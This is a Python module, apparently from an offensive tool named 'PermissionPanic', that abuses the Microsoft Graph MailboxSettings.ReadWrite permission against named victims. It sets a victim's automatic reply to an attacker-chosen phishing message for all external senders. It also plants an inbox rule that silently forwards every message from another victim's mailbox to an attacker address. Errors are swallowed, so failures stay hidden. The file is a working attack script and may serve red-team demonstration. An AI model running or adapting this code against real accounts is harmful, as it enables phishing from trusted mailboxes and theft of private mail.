import requests
import colorama
from colorama import Fore, Style
from datetime import datetime, timedelta


def mailbox_Vectors(request_headers, mailboxSettings):
    print()
    print(
        "MailboxSettings.ReadWrite - Allows the app to create, read, update, and delete user's mailbox settings without a signed-in user.")
    print()
    try:
        print("Attack vector - phishing")
        current_time = datetime.now()
        formatted_time = current_time.strftime("%Y-%m-%dT%H:%M:%S.%f")
        formatted_time = formatted_time[:-3] + "000" + formatted_time[-3:]

        one_hour_delta = timedelta(hours=1)
        updated_time = current_time + one_hour_delta

        # Format the updated time string
        formatted_nexthour = updated_time.strftime("%Y-%m-%dT%H:%M:%S.%f")

        # Add trailing zeros to microseconds if needed
        formatted_nexthour = formatted_nexthour[:-3] + "000" + formatted_nexthour[-3:]

        create_message_URL = "https://graph.microsoft.com/v1.0/users/" + mailboxSettings["victim"] +"/mailboxSettings"
        message_obj = {
            "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#Me/mailboxSettings",
            "automaticRepliesSetting": {
                "status": "AlwaysEnabled",
                "externalAudience": "all",
                "externalReplyMessage": mailboxSettings["message"],
                "internalReplyMessage": mailboxSettings["message"],
                "scheduledStartDateTime": {
                  "dateTime": formatted_time,
                  "timeZone": "UTC"
                },
                "scheduledEndDateTime": {
                  "dateTime": formatted_nexthour,
                  "timeZone": "UTC"
                }
            }
        }

        result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)
        if result.status_code == 200:
            print(Fore.GREEN + "changed the automatic reply of " + mailboxSettings["victim"])
            print(Style.RESET_ALL)

        print("Attack vector - mails redirection")
        create_message_URL = "https://graph.microsoft.com/v1.0/users/" + mailboxSettings["readingVictim"] + "/mailFolders/inbox/messageRules"
        body = {
            "displayName": "From PermissionPanic",
            "sequence": 2,
            "isEnabled": "true",
            "conditions": {
                "isVoicemail": "false",
             },
             "actions": {
                "forwardTo": [
                  {
                     "emailAddress": {
                        "name": "attacker",
                        "address": mailboxSettings["attacker"]
                      }
                   }
                ],
                "stopProcessingRules": "true"
             }
        }
        result = requests.post(create_message_URL, json=body, headers=request_headers)
        print(result.text)
        if result.status_code == 201:
            print(Fore.GREEN + "set rule to send mails from " + mailboxSettings["readingVictim"] + " to " + mailboxSettings["attacker"] )
            print(Style.RESET_ALL)


    except:
        pass
